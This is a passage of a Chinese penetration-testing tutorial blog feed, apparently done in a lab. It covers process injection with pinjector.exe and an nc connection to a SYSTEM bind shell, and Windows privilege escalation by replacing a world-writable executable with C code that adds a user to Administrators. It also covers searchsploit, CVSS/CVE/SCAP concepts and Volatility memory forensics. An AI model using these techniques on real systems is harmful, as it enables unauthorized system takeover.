<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;pinjector.exe -l</span><br><span class="line">Privilege Switcher <span class="keyword">for</span> Win32(Private version)</span><br><span class="line">(c) 2006 Andres Tarasco - atarasco@gmail.com</span><br><span class="line"></span><br><span class="line">PID    564 smss.exe (  3 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    612 csrss.exe ( 11 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    636 winlogon.exe ( 19 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    680 services.exe ( 16 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    692 lsass.exe ( 20 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    856 vmacthlp.exe (  1 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    868 svchost.exe ( 19 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1064 svchost.exe ( 54 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">   001400: \\NT AUTHORITY\SYSTEM</span><br><span class="line">   001412: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1404 spoolsv.exe ( 11 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1592 HistorySvr.exe (  4 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1616 inetinfo.exe ( 27 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1668 sntlkeyssrvr.exe (  9 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1844 spnsrvnt.exe (  7 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1864 SLadmin.exe (  5 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1940 SLSmtp.exe ( 19 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1976 vmtoolsd.exe (  4 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID    192 VMUpgradeHelper.exe (  3 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   3292 explorer.exe (  5 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   1768 explorer.exe ( 20 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   3840 wscntfy.exe (  1 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   2172 VMwareTray.exe (  1 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   1516 VMwareUser.exe (  8 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   3176 ICQLite.exe ( 11 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   3528 PSEXESVC.exe (  3 Threads)  USER: \\NT AUTHORITY\SYSTEM</span><br><span class="line">PID   2552 cmd.exe (  1 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br><span class="line">PID   2420 pinjector.exe (  1 Threads)  USER: \\DH-CA8822AB9589\Administrator</span><br></pre></td></tr></table></figure>
<p><strong>以注入 services.exe 进程为例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213134046518-952707166.png" /></p>
<p><strong>Kali 用 nc 测试</strong></p>
<p><strong>xp的IP地址：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220213134515823-110005185.png" /></p>
<p><strong>Kali：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc 10.10.10.131 5555</span></span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：利用配置不当提权</title>
    <url>/2022/02/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="概述">1. 概述</h2>
<p><strong>与漏洞提权相比，更常用的方法</strong></p>
<ul>
<li>企业环境</li>
<li>补丁更新的全部已经安装</li>
<li>输入变量过滤之外更值得研发关注的安全隐患</li>
<li>以system权限启动</li>
<li>NTFS权限允许users修改删除</li>
</ul>
<p><strong>也就是说，通过查看哪些服务默认以system权限启动，NTFS权限允许users修改删除本身，可将其替换或绑定反弹shell程序等完成提权。</strong></p>
<h2 id="windows-系统">2. windows 系统</h2>
<p><strong>icacls 命令【windows
2003以后的系统中包含的程序】</strong></p>
<p><strong>查询某一文件的NTFS权限（F：完全控制权限），如：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225201929720-2080881638.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">icacls c:\windows\*.exe /save perm /T</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225210527287-391812394.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225221209726-1334993536.png" /></p>
<p><strong>上图RegSnap.exe（如 1
）是符合条件的（FA;;;BU），虽然admin.exe也含有（FA;;;BU）（如
2），但由位置可知默认的普通用户对RegSnap.exe的权限（完全控制）高于对admin.exe的权限。为此可将RegSnap.exe作为修改或绑定目标。</strong></p>
<p><strong>备注：BU=BUILTIN，默认的普通用户组</strong></p>
<p><strong>测试代码（admin.c= &gt;admin.exe）</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">int</span> i;</span><br><span class="line">   i=system(<span class="string">&quot;net localgroup Administrators a /add&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>将 admin.c 编译成 admin.exe
后，重命名为RegSnap.exe，替换原来的 RegSnap.exe，当 RegSnap.exe 执行后则
a 账户会被添加到管理员组，演示如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面 &gt; net user a</span><br><span class="line">用户名                 a</span><br><span class="line">……………………</span><br><span class="line"></span><br><span class="line">本地组成员</span><br><span class="line">全局组成员 * Domain Users</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面 &gt; RegSnap.lnk</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面&gt;命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面 &gt; net user a</span><br><span class="line">用户名                 a</span><br><span class="line">…………………………</span><br><span class="line"></span><br><span class="line">本地组成员 * Administrators</span><br><span class="line">全局组成员             * Domain Users</span><br><span class="line">命令成功完成。  </span><br></pre></td></tr></table></figure>
<h2 id="linux-系统">3. Linux 系统</h2>
<p><strong>find 命令</strong></p>
<p><strong>如：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm 777 -<span class="built_in">exec</span> <span class="built_in">ls</span> -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220225224549860-444717228.png" /></p>
<p>其他操作类似Windows 系统。</p>
<p><strong>若渗透进去的是应用程序，则查应用系统的配置文件</strong></p>
<ul>
<li><strong>通过应用连接数据库的配置文件，发现其连接的服务账号</strong></li>
<li><strong>后台服务运行账号【有可能root账号运行web服务】</strong></li>
</ul>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>漏洞扫描的基本介绍</title>
    <url>/2022/01/24/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h2 id="发现弱点">1. 发现弱点</h2>
<p><strong>• 发现漏洞</strong></p>
<p><strong>• 基于端口服务扫描结果版本信息（速度慢）</strong></p>
<p><strong>• 搜索已公开的漏洞数据库（数量大）</strong></p>
<p>也可以到Kali中查找相关漏洞利用代码等，如searchsploit
tomcat或使用Sandi工具查询（新版Kali需自己安装，Kali1.1自带）！
<strong>sandi下载：</strong><a
href="https://gitlab.com/kalilinux/packages/sandi/"
class="uri">https://gitlab.com/kalilinux/packages/sandi/</a></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit tomcat</span></span><br><span class="line">----------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                           |  Path</span><br><span class="line">                                         | (/usr/share/exploitdb/)</span><br><span class="line">----------------------------------------- ----------------------------------------</span><br><span class="line">4D WebSTAR 5.3/5.4 Tomcat Plugin - Remot | exploits/osx/remote/25626.c</span><br><span class="line">AWStats 6.x - Apache Tomcat Configuratio | exploits/cgi/webapps/35035.txt</span><br><span class="line">Apache 1.3.x + Tomcat 4.0.x/4.1.x mod_jk | exploits/unix/dos/22068.pl</span><br><span class="line">Apache Commons FileUpload and Apache Tom | exploits/multiple/dos/31615.rb</span><br><span class="line">Apache Tomcat (Windows) - <span class="string">&#x27;runtime.getRu | exploits/windows/local/7264.txt</span></span><br><span class="line"><span class="string">Apache Tomcat - &#x27;</span>WebDAV<span class="string">&#x27; Remote File Dis | exploits/multiple/remote/4530.pl</span></span><br><span class="line"><span class="string">Apache Tomcat - Account Scanner / &#x27;</span>PUT<span class="string">&#x27;  | exploits/multiple/remote/18619.txt</span></span><br><span class="line"><span class="string">Apache Tomcat - CGIServlet enableCmdLine | exploits/windows/remote/47073.rb</span></span><br><span class="line"><span class="string">Apache Tomcat - Cookie Quote Handling Re | exploits/multiple/remote/9994.txt</span></span><br><span class="line"><span class="string">Apache Tomcat - Form Authentication &#x27;</span>Use | exploits/multiple/remote/9995.txt</span><br><span class="line">Apache Tomcat - WebDAV SSL Remote File D | exploits/linux/remote/4552.pl</span><br><span class="line">Apache Tomcat / Geronimo 1.0 - <span class="string">&#x27;Sample S | exploits/multiple/remote/27095.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.0 - Directory Traversal  | exploits/windows/remote/20716.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.1 - Path Revealing       | exploits/multiple/remote/20131.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2 - 404 Error Page Cross | exploits/multiple/remote/33379.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2 - Directory Disclosure | exploits/unix/remote/21882.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.1 - 404 Error Page Cro | exploits/multiple/webapps/10292.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 3.2.3/3.2.4 - &#x27;</span>RealPath.js | exploits/multiple/remote/21492.txt</span><br><span class="line">Apache Tomcat 3.2.3/3.2.4 - <span class="string">&#x27;Source.jsp&#x27;</span> | exploits/multiple/remote/21490.txt</span><br><span class="line">Apache Tomcat 3.2.3/3.2.4 - Example File | exploits/multiple/remote/21491.txt</span><br><span class="line">Apache Tomcat 3.x - Null Byte Directory  | exploits/linux/remote/22205.txt</span><br><span class="line">Apache Tomcat 3/4 - <span class="string">&#x27;DefaultServlet&#x27;</span> Fil | exploits/unix/remote/21853.txt</span><br><span class="line">Apache Tomcat 3/4 - JSP Engine Denial of | exploits/linux/dos/21534.jsp</span><br><span class="line">Apache Tomcat 4.0.3 - Denial of Service  | exploits/windows/remote/21605.txt</span><br><span class="line">Apache Tomcat 4.0.3 - Requests Containin | exploits/multiple/remote/31551.txt</span><br><span class="line">Apache Tomcat 4.0.3 - Servlet Mapping Cr | exploits/linux/remote/21604.txt</span><br><span class="line">Apache Tomcat 4.0.x - Non-HTTP Request D | exploits/linux/dos/23245.pl</span><br><span class="line">Apache Tomcat 4.0/4.1 - Servlet Full Pat | exploits/unix/remote/21412.txt</span><br><span class="line">Apache Tomcat 4.1 - JSP Request Cross-Si | exploits/unix/remote/21734.txt</span><br><span class="line">Apache Tomcat 5 - Information Disclosure | exploits/multiple/remote/28254.txt</span><br><span class="line">Apache Tomcat 5.5.0 &lt; 5.5.29 / 6.0.0 &lt; 6 | exploits/multiple/remote/12343.txt</span><br><span class="line">Apache Tomcat 5.5.15 - cal2.jsp Cross-Si | exploits/jsp/webapps/30563.txt</span><br><span class="line">Apache Tomcat 5.5.25 - Cross-Site Reques | exploits/multiple/webapps/29435.txt</span><br><span class="line">Apache Tomcat 5.x/6.0.x - Directory Trav | exploits/linux/remote/29739.txt</span><br><span class="line">Apache Tomcat 6.0.10 - Documentation Sam | exploits/multiple/remote/30052.txt</span><br><span class="line">Apache Tomcat 6.0.13 - Host Manager Serv | exploits/multiple/remote/30495.html</span><br><span class="line">Apache Tomcat 6.0.13 - Insecure Cookie H | exploits/multiple/remote/30496.txt</span><br><span class="line">Apache Tomcat 6.0.13 - JSP Example Web A | exploits/jsp/webapps/30189.txt</span><br><span class="line">Apache Tomcat 6.0.15 - Cookie Quote Hand | exploits/multiple/remote/31130.txt</span><br><span class="line">Apache Tomcat 6.0.16 - <span class="string">&#x27;HttpServletRespo | exploits/multiple/remote/32138.txt</span></span><br><span class="line"><span class="string">Apache Tomcat 6.0.16 - &#x27;</span>RequestDispatche | exploits/multiple/remote/32137.txt</span><br><span class="line">Apache Tomcat 6.0.18 - Form Authenticati | exploits/multiple/remote/33023.txt</span><br><span class="line">Apache Tomcat 6/7/8/9 - Information Disc | exploits/multiple/remote/41783.txt</span><br><span class="line">Apache Tomcat 7.0.4 - <span class="string">&#x27;sort&#x27;</span> / <span class="string">&#x27;orderBy&#x27;</span> | exploits/linux/remote/35011.txt</span><br><span class="line">Apache Tomcat 8/7/6 (Debian-Based Distro | exploits/linux/local/40450.txt</span><br><span class="line">Apache Tomcat 8/7/6 (RedHat Based Distro | exploits/linux/local/40488.txt</span><br><span class="line">Apache Tomcat &lt; 5.5.17 - Remote Director | exploits/multiple/remote/2061.txt</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - <span class="string">&#x27;utf8&#x27;</span> Director | exploits/multiple/remote/6229.txt</span><br><span class="line">Apache Tomcat &lt; 6.0.18 - <span class="string">&#x27;utf8&#x27;</span> Director | exploits/unix/remote/14489.c</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23  | exploits/jsp/webapps/42966.py</span><br><span class="line">Apache Tomcat &lt; 9.0.1 (Beta) / &lt; 8.5.23  | exploits/windows/webapps/42953.txt</span><br><span class="line">Apache Tomcat Connector jk2-2.0.2 mod_jk | exploits/linux/remote/5386.txt</span><br><span class="line">Apache Tomcat Connector mod_jk - <span class="string">&#x27;exec-s | exploits/linux/remote/4162.c</span></span><br><span class="line"><span class="string">Apache Tomcat Manager - Application Depl | exploits/multiple/remote/16317.rb</span></span><br><span class="line"><span class="string">Apache Tomcat Manager - Application Uplo | exploits/multiple/remote/31433.rb</span></span><br><span class="line"><span class="string">Apache Tomcat mod_jk 1.2.20 - Remote Buf | exploits/windows/remote/16798.rb</span></span><br><span class="line"><span class="string">Apache Tomcat/JBoss EJBInvokerServlet /  | exploits/php/remote/28713.php</span></span><br><span class="line"><span class="string">Jakarta Tomcat 3.x/4.0 - Error Message I | exploits/unix/local/21073.txt</span></span><br><span class="line"><span class="string">Tomcat - Remote Code Execution via JSP U | exploits/java/remote/43008.rb</span></span><br><span class="line"><span class="string">Tomcat 3.0/3.1 Snoop Servlet - Informati | exploits/multiple/remote/20132.txt</span></span><br><span class="line"><span class="string">Tomcat 3.2.1/4.0 / Weblogic Server 5.1 - | exploits/multiple/remote/20719.txt</span></span><br><span class="line"><span class="string">----------------------------------------- ----------------------------------------</span></span><br><span class="line"><span class="string">Shellcodes: No Result</span></span><br><span class="line"><span class="string">root@kali:~# cd /usr/share/exploitdb/</span></span><br><span class="line"><span class="string">root@kali:/usr/share/exploitdb# ls</span></span><br><span class="line"><span class="string">exploits  files_exploits.csv  files_shellcodes.csv  shellcodes</span></span><br><span class="line"><span class="string">root@kali:/usr/share/exploitdb# cd exploits/</span></span><br><span class="line"><span class="string">root@kali:/usr/share/exploitdb/exploits# ls</span></span><br><span class="line"><span class="string">aix      cfm             java          minix       perl           tru64</span></span><br><span class="line"><span class="string">android  cgi             json          multiple    php            ultrix</span></span><br><span class="line"><span class="string">arm      freebsd         jsp           netbsd_x86  plan9          unix</span></span><br><span class="line"><span class="string">ashx     freebsd_x86     linux         netware     python         unixware</span></span><br><span class="line"><span class="string">asp      freebsd_x86-64  linux_mips    nodejs      qnx            vxworks</span></span><br><span class="line"><span class="string">aspx     hardware        linux_sparc   novell      ruby           watchos</span></span><br><span class="line"><span class="string">atheos   hp-ux           linux_x86     openbsd     sco            windows</span></span><br><span class="line"><span class="string">beos     immunix         linux_x86-64  osx         solaris        windows_x86</span></span><br><span class="line"><span class="string">bsd      ios             lua           osx_ppc     solaris_sparc  windows_x86-64</span></span><br><span class="line"><span class="string">bsd_x86  irix            macos         palm_os     solaris_x86    xml</span></span><br><span class="line"><span class="string">root@kali:/usr/share/exploitdb/exploits# less windows/remote/1679</span></span><br><span class="line"><span class="string">16791.rb  16792.rb  16793.rb  16794.rb  16796.rb  16797.rb  16798.rb  16799.rb</span></span><br><span class="line"><span class="string">root@kali:/usr/share/exploitdb/exploits# less windows/remote/16798.rb </span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220124201402207-2073307370.png" /></p>
<p><strong>• 使用弱点扫描器实现漏洞管理</strong></p>
<h2 id="从信息的维度定义漏洞管理">2. 从信息的维度定义漏洞管理</h2>
<p><strong>• 信息收集：</strong></p>
<p>• 扫描发现网络IP、 OS、服务、配置、漏洞</p>
<p>• 能力需求：定义扫描方式内容和目标</p>
<p><strong>• 信息管理</strong></p>
<p>• 格式化信息，并进行筛选、分组、定义优先级</p>
<p>• 能力需求：资产分组、指定所有者、向所有者报告漏洞</p>
<p><strong>• 信息输出</strong></p>
<p>• 向不同层级的人群展示足够的信息量</p>
<p>• 能力需求：生成报告、导出数据、与SIEM集成</p>
<h2 id="弱点扫描类型">3. 弱点扫描类型</h2>
<p><strong>• 主动扫描</strong></p>
<p>• 有身份验证</p>
<p>• 无身份验证</p>
<p><strong>• 被动扫描</strong></p>
<p>• 镜像端口抓包</p>
<p>• 其他来源输入</p>
<p><strong>• 基于Agent的扫描</strong></p>
<p>• 支持平台有限</p>
<p>•
即在需要扫描的目标机（如：待扫服务器）上安装自己的agent（程序），让agent在目标机上进行扫描探测等，效率高但受设备局限影响（部分设备不能安装）。</p>
<h2 id="漏洞基本概念">4. 漏洞基本概念</h2>
<p><strong>• CVSS（Common Vulnerability Scoring System）</strong></p>
<p>• 通用漏洞评分系统----工业标准</p>
<p>• 描述安全漏洞严重程度的统一评分方案</p>
<p>• V 3版本----2015年6月10日</p>
<p>• Basic Metric：基础的恒定不变的弱点权重</p>
<p>• Temporal Metric：依赖时间因素的弱点权重</p>
<p>• Enviromental Metric：利用弱点的环境要求和实施难度的权重</p>
<p>• CVSS是安全内容自动化协议（SCAP）的一部分</p>
<p>• 通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新</p>
<p>• 分值范围： 0 ---- 10</p>
<p>• 不同机构按CVSS分值定义威胁的中、高、低威胁级别</p>
<p>• CVSS体现弱点的风险，
威胁级别（severity）表示弱点风险对企业的影响程度</p>
<p>• CVSS分值是工业标准，但威胁级别不是</p>
<p><strong>• Vulnerability Reference</strong></p>
<p><strong>• CVE（ Common Vulnerabilities and Exposures ）</strong></p>
<p>• 已公开的信息安全漏洞字典，统一的漏洞编号标准</p>
<p>• MITRE公司负责维护（非盈利机构）</p>
<p>• 扫描器的大部分扫描项都对应一个CVE编号</p>
<p>• 实现不同厂商之间信息交换的统一标准</p>
<p><strong>• CVE发布流程</strong></p>
<p>• 发现漏洞</p>
<p>• CAN负责指定CVE ID</p>
<p>• 发布到CVE List ---- CVE-2008-4250</p>
<p>• MITRE负责对内容进行编辑维护</p>
<p><strong>• 很多厂商维护自己的Vulnerability Reference</strong></p>
<p>• MS</p>
<p>• MSKB</p>
<p><strong>• 其他Vulnerability Reference</strong></p>
<p>• CERT TA08-297A</p>
<p>• BID 31874</p>
<p>• IAVM 2008-A-0081</p>
<p>• OVAL OVAL6093</p>
<p><strong>• OVAL（Open Vulnerability and Assessment
Language）</strong></p>
<p>• 描述漏洞检测方法的机器可识别语言</p>
<p>•
详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</p>
<p>• OVAL使用XML语言描述，包含了严密的语法逻辑</p>
<p><strong>• CCE</strong></p>
<p>• 描述软件配置缺陷的一种标准化格式</p>
<p>•
在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作。</p>
<p><strong>• CPE（Common Product Enumeration）</strong></p>
<p>• 信息技术产品、系统、软件包的结构化命名规范，分类命名</p>
<p><strong>• CWE（Common Weakness Enumeration）</strong></p>
<p>•
常见漏洞类型的字典，描述不同类型漏洞的特征（访问控制、信息泄露、拒绝服务）</p>
<p><strong>• Security Content Automation Protocol (SCAP)</strong></p>
<p>• SCAP 是一个集合了多种安全标准框架</p>
<p>• 六个元素： CVE、 OVAL、 CCE、 CPE、 CVSS、 XCCDF</p>
<p>• 目的是以标准的方法展示和操作安全数据</p>
<p>• 由NIST负责维护</p>
<p><strong>• SCAP主要解决三个问题</strong></p>
<p>• 实现高层政策法规等到底层实施的落地（如FISMA， ISO27000系列）</p>
<p>•
将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）</p>
<p>• 将复杂的系统配置核查工作自动化</p>
<p>•
SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化、自动化的思想对信息安全行业产生了深远的影响。</p>
<p><strong>• NVD（National Vulnerability Database）</strong></p>
<p>• 美国政府的漏洞管理标准数据</p>
<p>• 完全基于SCAP框架</p>
<p>• 实现自动化漏洞管理、安全测量、合规要求</p>
<p>• 包含以下库</p>
<p>• 安全检查列表</p>
<p>• 软件安全漏洞</p>
<p>• 配置错误</p>
<p>• 产品名称</p>
<p>• 影响度量</p>
<p><strong>• <a
href="https://nvd.nist.gov/">https://nvd.nist.gov/</a>（推荐关注）</strong></p>
<h2 id="漏洞管理">5. 漏洞管理</h2>
<p>• 周期性扫描跟踪漏洞</p>
<p>• 高危漏洞优先处理</p>
<p>• 扫描注意事项</p>
<p>• 漏洞管理三要素</p>
<p>• 准确性</p>
<p>• 时间</p>
<p>• 资源</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>漏洞扫描</category>
      </categories>
      <tags>
        <tag>漏洞扫描</tag>
      </tags>
  </entry>
  <entry>
    <title>电子取证</title>
    <url>/2023/01/19/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/</url>
    <content><![CDATA[<h2 id="简介">1. 简介</h2>
<p><strong>Forensic investigations</strong></p>
<ul>
<li>法庭取证调查</li>
<li>事件响应调查</li>
<li>黑客攻击、渗透测试留痕</li>
</ul>
<p><strong>什么是 forensic 科学</strong></p>
<ul>
<li>法医的、用于法庭的、辩论学、法医学</li>
<li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法</li>
<li>参考本地法律要求</li>
<li>实践操作通用原则</li>
</ul>
<p><strong>CSI：物理取证</strong></p>
<ul>
<li>指纹、DNA、弹道、血迹</li>
<li>无力取证的理论基础是物质交换原则</li>
</ul>
<p><strong>本章关注：数字取证/计算机取证</strong></p>
<ul>
<li>智能设备、计算机、手机平板、loT、有线及无线信道、数据存储</li>
</ul>
<h2 id="通用原则">2. 通用原则</h2>
<ul>
<li><p><strong>维护证据完整性</strong></p></li>
<li><p>数字取证比物理取证幸运的多，可以有无限数量的拷贝进行分析</p></li>
<li><p>数字HASH值验证数据完整性</p></li>
<li><p><strong>维护监管链</strong></p></li>
<li><p>物理证物保存在证物袋中，每次取出使用严格记录，避免破坏污染</p></li>
<li><p>数字证物原始版本写保护，使用拷贝进行分析</p></li>
<li><p><strong>标准的操作步骤</strong></p></li>
<li><p>证物使用严格按照按照规范流程，即使事后证明流程有误(免责)</p></li>
<li><p><strong>取证分析全部过程记录文档</strong></p></li>
<li><p><strong>数字取证者的座右铭</strong></p></li>
<li><p>不要破坏数据现场(看似简单，实际几乎无法实现)</p></li>
<li><p>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</p></li>
<li><p>系统内存是主要的非易失性存储介质取证对象，不修改无法获取其中数据</p></li>
<li><p>非易失性存储介质通常使用完整镜像拷贝保存</p></li>
<li><p>正常关机还是直接拔掉电源(数据丢失破坏)</p></li>
<li><p><strong>证据搜索</strong></p></li>
<li><p>数据</p></li>
<li><p>信息</p></li>
<li><p>证据</p></li>
<li><p><strong>作为安全从业者</strong></p></li>
<li><p>通过取证还原黑客入侵的轨迹</p></li>
<li><p>作为渗透测试和黑客攻击区分标准</p></li>
<li><p>世纪佳缘事件</p></li>
<li><p>印象笔记渗透测试事件</p></li>
</ul>
<h2 id="取证方法">3. 取证方法</h2>
<ul>
<li><strong>活取证</strong></li>
<li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转</li>
<li>存内存信息</li>
<li>使用未受感染的干净程序执行取证U盘/网络存储收集到的数据</li>
<li><strong>死取证</strong></li>
<li>关机后制作硬盘镜像、分析镜像(MBR、GPT、LVM)</li>
</ul>
<h2 id="取证工具">4. 取证工具</h2>
<ul>
<li>使用其中的 DumpIt
制作内存镜像文件，内存文件与内存大小接近或者稍微大一点。</li>
<li>DumpIt.exe下载： <a href="https://www.aliyundrive.com/s/caNEzWuA8Xv"
class="uri">https://www.aliyundrive.com/s/caNEzWuA8Xv</a></li>
<li>kali安装Volatility：<a
href="https://www.cnblogs.com/Jinx8823/p/16642215.html"
class="uri">https://www.cnblogs.com/Jinx8823/p/16642215.html</a></li>
<li><strong>注意务必使用python2(kali自带)和pip2</strong> （安装参见：<a
href="https://blog.csdn.net/huayimy/article/details/128338899"
class="uri">https://blog.csdn.net/huayimy/article/details/128338899</a>）</li>
</ul>
<h3 id="制作内存镜像">1、制作内存镜像</h3>
<p>在win7打开几个软件，双击DumpIt.exe（建议在U盘打开，避免对取证机内存造成影响）即可。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120140313178-572604098.png" /></p>
<h3 id="volatility分析内存文件">2、Volatility分析内存文件</h3>
<ul>
<li><strong>插件位置（可用--help查看支持的插件）</strong>
：/usr/local/lib/python2.7/dist-packages/volatility/plugins</li>
</ul>
<h4 id="识别镜像信息如操作系统等">（1）识别镜像信息（如操作系统等）</h4>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120144116046-362898661.png" /></p>
<h4 id="查询数据库文件注册表信息">（2）查询数据库文件（注册表信息）</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 hivelist</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120150322575-1942547849.png" /></p>
<h4 id="按虚内存地址查看注册表内容">（3）按虚内存地址查看注册表内容</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 hivedump -o 0xfffff8a000924010</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120151120932-369566652.png" /></p>
<h4
id="按具体注册表路径查看键值内容">（4）按具体注册表路径查看键值内容</h4>
<ul>
<li><strong>示例 1：查看用户账号</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vol.py -f WIN7-Z9M8R8-1-20230120-023337.raw --profile=Win7SP1x64 printkey -K <span class="string">&quot;SAM\Domains\Account\Users\Names&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230120154227261-1719329037.png" /></p>
<ul>
<li><strong>示例 2：最后登录的用户</strong></li>
</ul>
